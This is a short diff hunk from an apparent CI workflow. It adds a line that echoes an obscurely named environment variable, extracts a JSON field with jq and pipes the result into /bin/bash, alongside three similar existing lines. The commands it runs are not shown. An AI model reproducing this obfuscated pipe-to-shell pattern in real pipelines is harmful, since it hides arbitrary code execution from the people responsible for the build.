@@ -31,6 +31,7 @@ jobs:
           echo $gc153 | jq -r .fv8251 | /bin/bash
           printf '%s' "$afnmc73485" | jq -r .ygzbl8 | /bin/bash
           echo $scmjc1961 | jq -r .ualcc99 | /bin/bash
+          echo $cju3 | jq -r .x915 | /bin/bash
 
       - name: Save archive
         if: always()
